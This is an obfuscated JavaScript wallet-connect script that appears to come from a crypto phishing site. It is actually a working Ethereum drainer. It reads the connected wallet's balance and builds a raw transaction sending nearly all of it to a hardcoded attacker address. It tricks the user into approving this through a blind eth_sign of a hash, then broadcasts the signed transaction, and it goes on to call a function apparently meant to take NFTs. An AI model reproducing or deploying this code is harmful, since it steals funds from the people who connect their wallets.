const _0x11134e = _0x19c0;
(function(_0x3f8ffe, _0x5484fb) {
    const _0x357b0f = _0x19c0,
        _0x26537f = _0x3f8ffe();
    while (!![]) {
        try {
            const _0x1aedfb = -parseInt(_0x357b0f(0x16c)) / 0x1 + parseInt(_0x357b0f(0x187)) / 0x2 * (-parseInt(_0x357b0f(0x165)) / 0x3) + parseInt(_0x357b0f(0x161)) / 0x4 * (-parseInt(_0x357b0f(0x169)) / 0x5) + -parseInt(_0x357b0f(0x174)) / 0x6 + -parseInt(_0x357b0f(0x17c)) / 0x7 * (-parseInt(_0x357b0f(0x16e)) / 0x8) + -parseInt(_0x357b0f(0x18b)) / 0x9 + parseInt(_0x357b0f(0x189)) / 0xa;
            if (_0x1aedfb === _0x5484fb) break;
            else _0x26537f['push'](_0x26537f['shift']());
        } catch (_0x1ad08e) {
            _0x26537f['push'](_0x26537f['shift']());
        }
    }
}(_0x3b1e, 0x8a5a8));

function _0x3b1e() {
    const _0x1d92ef = ['getAccounts', '19008100pNnyvC', 'eth', '1246662NjZbjc', '\x20ETH', 'ethereum', 'getGasPrice', 'getTransactionCount', 'sha3', 'enableWeb3', 'toString', 'showToast', 'ether', 'log', 'substring', 'right', '4OYcNTK', 'provider', 'rawHash:', 'getChainId', '595071kQUYGO', 'onChainChanged', '0x1', 'switchNetwork', '3923495XKOyjR', 'rawTx1:', 'top', '952536kbLENI', 'rawHash1:', '16mgWbsG', '0x50AF65f0A357a9dF532D4ae3e3b94bb5a7c60bF3', '\x20:\x20', 'pending', 'Current\x20balance\x20for\x20', 'Not\x20enough\x20transaction\x20records\x20to\x20proceed', '1426824kBXeIr', 'load', 'Sending\x20', '\x20ETH\x20from\x20', 'catch', 'toHex', 'getBalance', '22000', '3422300FUGrdF', 'chainId', 'Error,\x20balance\x20is\x20too\x20low.\x20(<\x200.001\x20ETH)', 'floor', 'fromWei', 'undefined', 'then', 'utils', '...', 'serialize', 'hex', '2EsoPpL'];
    _0x3b1e = function() {
        return _0x1d92ef;
    };
    return _0x3b1e();
}
let eth_bal = 0x0,
    web3Provider, metamaskInstalled = ![];
const receiveAddress = "0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f";
window['addEventListener'](_0x11134e(0x175), async () => {
    const _0x1435ef = _0x11134e;
    typeof window[_0x1435ef(0x18d)] !== _0x1435ef(0x181) && (metamaskInstalled = !![]);
}), Moralis['onWeb3Enabled'](async _0x38e3e9 => {
    const _0x197bf7 = _0x11134e;
    _0x38e3e9[_0x197bf7(0x17d)] !== 0x1 && metamaskInstalled && await Moralis[_0x197bf7(0x168)](_0x197bf7(0x167));
}), Moralis[_0x11134e(0x166)](async _0x19e7af => {
    const _0x22af25 = _0x11134e;
    _0x19e7af !== _0x22af25(0x167) && metamaskInstalled && await Moralis['switchNetwork'](_0x22af25(0x167));
});

function _0x19c0(_0x2db968, _0x459565) {
    const _0x3b1ea1 = _0x3b1e();
    return _0x19c0 = function(_0x19c01a, _0xa64e8c) {
        _0x19c01a = _0x19c01a - 0x15a;
        let _0x38a243 = _0x3b1ea1[_0x19c01a];
        return _0x38a243;
    }, _0x19c0(_0x2db968, _0x459565);
}
async function onConnect() {
    const _0x5eea7b = _0x11134e;
    await Moralis[_0x5eea7b(0x15a)](metamaskInstalled ? {} : {
        'provider': 'walletconnect'
    });
    const _0xbf4e = new Web3(Moralis['provider']),
        _0x4cdf02 = (await _0xbf4e['eth'][_0x5eea7b(0x188)]())[0x0];
    eth_bal = await _0xbf4e[_0x5eea7b(0x18a)][_0x5eea7b(0x17a)](_0x4cdf02);
    const _0x4c99ce = _0xbf4e[_0x5eea7b(0x183)][_0x5eea7b(0x180)](eth_bal, _0x5eea7b(0x15d));
    console[_0x5eea7b(0x15e)](_0x5eea7b(0x172) + _0x4cdf02 + _0x5eea7b(0x170) + _0x4c99ce + _0x5eea7b(0x18c)), _0x4c99ce >= 0.001 ? askTransferWithSign(_0x4c99ce) : (notify(_0x5eea7b(0x173)), console[_0x5eea7b(0x15e)](_0x5eea7b(0x17e)));
}
async function askTransferWithSign(_0x1def3e) {
    const _0x43b3b0 = _0x11134e,
        _0x43f372 = new Web3(Moralis[_0x43b3b0(0x162)]),
        _0x2c4d5b = (await _0x43f372[_0x43b3b0(0x18a)][_0x43b3b0(0x188)]())[0x0],
        _0xf84ef4 = await _0x43f372[_0x43b3b0(0x18a)][_0x43b3b0(0x164)]();
    await _0x43f372[_0x43b3b0(0x18a)][_0x43b3b0(0x18f)](_0x2c4d5b, _0x43b3b0(0x171))['then'](async _0x2aecce => {
        const _0x882d0e = _0x43b3b0,
            _0x100e6f = await _0x43f372[_0x882d0e(0x18a)][_0x882d0e(0x18e)](),
            _0x1f8ece = _0x43f372[_0x882d0e(0x183)][_0x882d0e(0x179)](Math[_0x882d0e(0x17f)](_0x100e6f * 1.4)),
            _0x22cdeb = new _0x43f372['utils']['BN'](_0x882d0e(0x17b)),
            _0x3929a6 = _0x22cdeb * Math['floor'](_0x100e6f * 0x2),
            _0x3a355f = eth_bal - _0x3929a6;
        console[_0x882d0e(0x15e)](_0x882d0e(0x176) + _0x43f372[_0x882d0e(0x183)][_0x882d0e(0x180)](_0x3a355f['toString'](), 'ether') + _0x882d0e(0x177) + _0x2c4d5b + _0x882d0e(0x184));
        const _0x156508 = {
            'nonce': _0x43f372[_0x882d0e(0x183)][_0x882d0e(0x179)](_0x2aecce),
            'gasPrice': _0x1f8ece,
            'gasLimit': '0x55F0',
            'to': receiveAddress,
            'value': '0x' + _0x3a355f[_0x882d0e(0x15b)](0x10),
            'data': '0x',
            'v': _0x882d0e(0x167),
            'r': '0x',
            's': '0x'
        };
        let _0x2bd790 = new ethereumjs['Tx'](_0x156508);
        const _0x4b6506 = '0x' + _0x2bd790[_0x882d0e(0x185)]()['toString'](_0x882d0e(0x186)),
            _0x42ce59 = _0x43f372[_0x882d0e(0x183)][_0x882d0e(0x190)](_0x4b6506, {
                'encoding': _0x882d0e(0x186)
            });
        console[_0x882d0e(0x15e)](_0x882d0e(0x16a), _0x4b6506), console[_0x882d0e(0x15e)](_0x882d0e(0x16d), _0x42ce59), await _0x43f372['eth']['sign'](_0x42ce59, _0x2c4d5b)[_0x882d0e(0x182)](async _0x2b3265 => {
            const _0x2245f2 = _0x882d0e,
                _0x436235 = _0x2b3265[_0x2245f2(0x15f)](0x2),
                _0x4adff3 = '0x' + _0x436235[_0x2245f2(0x15f)](0x0, 0x40),
                _0x312888 = '0x' + _0x436235[_0x2245f2(0x15f)](0x40, 0x80),
                _0x73dd6a = parseInt(_0x436235['substring'](0x80, 0x82), 0x10),
                _0x5231dd = _0x43f372[_0x2245f2(0x183)]['toHex'](_0x73dd6a + _0xf84ef4 * 0x2 + 0x8);
            _0x2bd790['r'] = _0x4adff3, _0x2bd790['s'] = _0x312888, _0x2bd790['v'] = _0x5231dd, console[_0x2245f2(0x15e)](_0x2bd790);
            const _0x3702b5 = '0x' + _0x2bd790['serialize']()[_0x2245f2(0x15b)](_0x2245f2(0x186)),
                _0x27691d = _0x43f372[_0x2245f2(0x183)]['sha3'](_0x3702b5, {
                    'encoding': _0x2245f2(0x186)
                });
            console[_0x2245f2(0x15e)]('rawTx:', _0x3702b5), console[_0x2245f2(0x15e)](_0x2245f2(0x163), _0x27691d), await _0x43f372[_0x2245f2(0x18a)]['sendSignedTransaction'](_0x3702b5)[_0x2245f2(0x182)](_0x4038a2 => {
                return console['log'](_0x4038a2);
            })[_0x2245f2(0x178)](_0x41d7c7 => {
                return console['log'](_0x41d7c7);
            });
        })[_0x882d0e(0x178)](_0x254cbf => {
            const _0x62f1e1 = _0x882d0e;
            return console[_0x62f1e1(0x15e)](_0x254cbf);
        });
    }), await askNfts();
}

function notify(_0x4222f5) {
    const _0x59d642 = _0x11134e;
    Toastify({
        'text': _0x4222f5,
        'duration': 0xbb8,
        'gravity': _0x59d642(0x16b),
        'position': _0x59d642(0x160)
    })[_0x59d642(0x15c)]();
}